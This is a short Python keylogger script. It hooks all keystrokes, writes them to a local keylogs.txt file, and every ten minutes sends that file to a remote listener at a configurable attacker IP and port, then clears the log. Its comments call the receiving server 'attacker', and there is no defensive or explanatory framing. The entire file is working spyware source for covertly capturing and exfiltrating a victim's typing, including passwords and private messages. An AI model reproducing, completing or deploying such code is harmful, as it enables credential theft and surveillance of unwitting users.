import os, time, keyboard
from datetime import datetime
import func as util

LHOST = "95.0.0.0"  # Change this to your IP
LPORT = "4000"          # Assigned port
KEYLOGS_FOLDER = os.path.dirname(os.path.realpath('__file__'))
WAIT_TIME = 600         # Default value is 10 minutes

# Function to write the keylogs to a file
def write_to_file(event):
    file_name = KEYLOGS_FOLDER + "/keylogs" + ".txt"

    # Write the pressed key to the log file
    if event.event_type == keyboard.KEY_DOWN:
        with open(file_name, "a") as f:

            # Filter some keys
            if keyboard.is_pressed('space'):
                f.write(" ")
            if keyboard.is_pressed('enter'):
                f.write("\n")
            else:
                f.write(event.name)
        
# Set up the listener for keyboard events
keyboard.hook(write_to_file)

while True:
    try:

        # Wait until sending file to attacker
        time.sleep(WAIT_TIME)

        if util.check_connection(LHOST,LPORT):

            # If there is internet connection, send the logs to the server  
            if util.send_to_server(LHOST,LPORT, KEYLOGS_FOLDER):
                # If logs are successfully sent, clear the text file
                util.clear_file(KEYLOGS_FOLDER)

# DEBUG
        #         print("SUCCESS")
        #     else:
        #         print("Failed to send logs to server.")
        # else:
        #     print("No internet connection. Continuing to log keystrokes.")

    except KeyboardInterrupt:
        # Exit the program when 'Ctrl+C' is pressed
        break